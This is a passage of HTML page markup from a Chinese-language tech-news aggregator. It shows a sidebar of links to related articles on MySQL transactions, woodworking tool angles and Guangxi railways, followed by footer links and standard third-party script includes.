<a href=../../tw/%E7%A7%91%E6%8A%80/c6e14bc6.html title=SQL基礎知識——事務>SQL基礎知識——事務</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/677306ff.html alt=面試總結：關於MySQL事務的10個問題常見面試問答 class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p1.pstatp.com/large/dfic-imagehandler/1669c986-315c-4339-a5a0-a918a47f2e57 style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/677306ff.html title=面試總結：關於MySQL事務的10個問題常見面試問答>面試總結：關於MySQL事務的10個問題常見面試問答</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/813d5912.html alt=關於Facebook像素，這些你瞭解嗎？ class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p1.pstatp.com/large/pgc-image/RM0p5dK51SH9EU style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/813d5912.html title=關於Facebook像素，這些你瞭解嗎？>關於Facebook像素，這些你瞭解嗎？</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/13eee8fe.html alt="清理“奇葩”證明 提升基層治理效能——《關於改進和規範基層群眾性自治組織出具證明工作的指導意見》專家談" class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p1.pstatp.com/large/pgc-image/R69nEZm84HSieS style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/13eee8fe.html title="清理“奇葩”證明 提升基層治理效能——《關於改進和規範基層群眾性自治組織出具證明工作的指導意見》專家談">清理“奇葩”證明 提升基層治理效能——《關於改進和規範基層群眾性自治組織出具證明工作的指導意見》專家談</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/8b79295e.html alt=木材切削原理與刀具：關於木工刀具的角度設計與角度大小的選擇 class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p3.pstatp.com/large/pgc-image/63844235ae1b4c45b355eda2c960bcb9 style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/8b79295e.html title=木材切削原理與刀具：關於木工刀具的角度設計與角度大小的選擇>木材切削原理與刀具：關於木工刀具的角度設計與角度大小的選擇</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/a9f75477.html alt=關於木工刀具角度 class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p1.pstatp.com/large/pgc-image/RLlITHkB9DnhAe style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/a9f75477.html title=關於木工刀具角度>關於木工刀具角度</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/218a90a9.html alt=淺談廣西沿海鐵路公司，到底寧局好還是沿海好？ class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p1.pstatp.com/large/pgc-image/153102100759992f2d934f2 style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/218a90a9.html title=淺談廣西沿海鐵路公司，到底寧局好還是沿海好？>淺談廣西沿海鐵路公司，到底寧局好還是沿海好？</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/0bbe5cba.html alt=淺談廣西高鐵里程，曾經以1700多公里奪冠，創下了輝煌史！ class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p1.pstatp.com/large/pgc-image/dbb04b7e14834fdda0eedea1205e664a style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/0bbe5cba.html title=淺談廣西高鐵里程，曾經以1700多公里奪冠，創下了輝煌史！>淺談廣西高鐵里程，曾經以1700多公里奪冠，創下了輝煌史！</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/b96594f0.html alt=淺談通信基本概念，收藏了 class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p1.pstatp.com/large/pgc-image/e1bea466fcaa45bbbe91877c2c083ebe style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/b96594f0.html title=淺談通信基本概念，收藏了>淺談通信基本概念，收藏了</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/b8e8a950.html alt=實車事故車案例——淺談事故車 class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p1.pstatp.com/large/pgc-image/4ac90de03c0549cb85a7d0a5c997753b style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/b8e8a950.html title=實車事故車案例——淺談事故車>實車事故車案例——淺談事故車</a></li><hr></ul></section><section class=widget><h3 class=widget-title>其他</h3><ul class=widget-list><li><a href=TOS.html>使用條款</a></li><li><a href=CommentPolicy.html>留言政策</a></li><li><a href=mailto:gdnews@tuta.io rel=nofollow>DMCA</a></li><li><a href=mailto:gdnews@tuta.io rel=nofollow>聯絡我們</a></li></ul></section></div></div></div></div><footer id=footer><div class=container>&copy; 2020 <a href>极客快訊</a></div></footer><script type=text/javascript>window.MathJax={tex2jax:{inlineMath:[['$','$']],processEscapes:true}};</script><script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script><a id=rocket href=#top></a><script type=text/javascript src=https://kknews.cf/js/totop.js async></script><script type=text/javascript src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5e508ed9e4e698bb"></script></body></html>